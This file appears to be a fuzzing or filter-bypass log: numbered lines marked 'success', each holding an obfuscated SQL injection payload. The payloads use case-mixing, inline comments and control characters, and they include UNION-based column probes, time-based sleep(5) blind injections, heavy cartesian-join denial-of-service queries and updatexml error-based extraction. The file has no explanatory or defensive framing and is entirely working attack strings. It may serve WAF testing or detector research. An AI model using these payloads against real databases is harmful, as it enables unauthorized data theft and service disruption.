1059 success "(sEleCT 1)'  )   WHeRe (selECT 7640)/**/  LiKE   7640 && make_set  (  8978 /**/ liKE   8594,(SeLEct 8594)/**/ )  -- M2"
1061 success "1'||  (  select\x0c'brsr' WherE 6797 IN (6796,6797,6798) AND 2998 LIKE 2998 AND 1 and True OR 0x79c like 1949 aNd/**/True oR False AnD 1 "
1063 success 'SELect * fRoM\tusers whErE id  =  1 <@. Or 0x1   LIKe   (sELECT 1) --\t1 '
1064 success '-4305   )    )     )   union/**/all SElEcT 2401,2401-- '
1067 success '-5322" union/**/all SELect 6494,6494,6494,6494,6494,6494-- '
1068 success '1" Where\x0c6850<>6851 OR 0 '
1069 success '-(SeLeCt 5147)\x0boR  /**/(  8459   LIKE /*|x\rq*/ 0x210b  )  *4906 '
1070 success '-3707"   )    ) /*|*/ /**/\n)    OR  0x217b   likE   (SELECT 8571)-- ZbMX<'
1072 success '1"  )   where 7548   LIKE   7548 OR 0 '
1073 success "-(sElEcT 1587)'  )   OR 8339  =  5540\x0c"
1074 success "1'  )   As bzem whERe 4240   LIKe   4240 "
1078 success '1\t )   where/**/0x12ac   LIKE   4780 OR 0 '
1080 success " || '1'    LIke    '0x1 "
1081 success "-0xfc0'  )   WheRE 9462 IN (9461,9462,9463) AND 'N'!='NH' Or 1809   LIKE   2810# "
1100 success "-6733'\xa0 )   wherE 4024   LIke  \n4024 union all SeLECt 4024,4024,4024,4024# "
1101 success "-0x1d2a wHerE 5161  =  5161 anD True or/**/'\r'<>'\rK' "
1102 success '1" and elt  (  9785\tNOT LIKE 9786 OR \'X\' NOT LIKE \'X\',sleep  (  5   ) /**/  )    '
1103 success "SElEcT * From users WHEre id  =  1\x0b+   (  $+ /**/)\n  OR/**/1  =  1 AND 'nyX'/**/LIKE 'nyX' -- 0x1 "
1104 success "-(seLECt 6218)'   )  \x0b )    OR 0x8bc  =  4469# "
1110 success 'seLEct   (  Case whEN   (  7163   lIKe \x0b 1777  )   tHEN 1 eLsE 7163*  (  seleCt 7163 fROM master..sysdatabases  )   eNd  )  -- '
1112 success "1   )    )    aS qsos/**/WHERe 0xaa1   lIKE   0xaa1 Or '-N' not like '-N' rlike   (  seLect * frOM   (  SEleCt  (  sleep /**/(  5   )  /**/ )     )  sgvo  )  -- "
1115 success '1  )   WherE (SeLECT 0x1e87)\x0b  LIKe /*1|_*/ 7815/**/union all sELect null,null,null,null,null,null,null# \tK8{'
1117 success '-5963"/*SAw*/OR 9323   LIKE  \x0b9323# '
1122 success "SElect count \x0c(\t\n*  )   FRom generate_series  (  0x1,5000000  )   aND    (    (   'hxcq' /**/ likE   'hxcq "
1123 success "-1602' or 4316 NOT LIKE 4317 "
1124 success 'SElect cAse WHEN 2930  =  7964 THen 0x1 ElSE null end-- '
1125 success '0x1 AnD (SEleCt 0x15b4)   LIkE     ( /**/SeLEct count\x0c (  *  )   FRom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- gynj '
1126 success 'SElECT   (  casE WhEn   (  5740   like   0x1dd4  )   then 5740 ELsE cast  (  1\x0bas int  )  /  (  selecT 0/**/frOM dual  )   enD  )   frOm/**/dual-- g'
1132 success "0x1'+  (  select 'zohk' wheRe 'w.@'<>'w.@-' OR False OR 2367   LIKE     (  SeLECT count  (  *  )   FROM rdb$fields As\tt1,rdb$types aS t2,rdb$collations as t3,rdb$functions aS t4  )  -- yz~"
1133 success '1"  )   WHere (sELecT 5358)   LIke   5358/**/'
1135 success '-8933  )   As iiyr whERe 1974  =  0x7b6 union all sElECt 1974,0x7b6,1974,1974,1974# '
1137 success "SeLEcT count  (\t * /**/)   frOM\x0call_users t1,all_users t2,all_users\x0ct3,all_users t4,all_users t5 aNd   (/**/ 'wweo'   LIKe   'wweo "
1138 success '(SELECT 0x1)  )   oR updatexml  (  0x710,concat  (  0x2e,0x7171706a71,  (  SElect   (  elt  (  0x710   Like   1808 OR False,1   )    )     )  ,0x717a767a71  )  ,8666  )   '
1139 success "1' WheRe/**/4245   likE   0x1095 union all SeLEcT null,null-- "
1140 success ' EnD AnD \x0b  (    (   "%"   like \n " '
1142 success '-0xe58"  /*cA\x0b*/)    )    union/**/all sEleCt/**/6093# Ab'
1143 success 'iif  ( \x0b1217/*v*/  like   8831,1,1/0x0  )   '
1144 success ' sELecT * FroM users WHERe id  =  1 OR "?  (  " OR\n1  =  1 && 0x1 -- 1 '
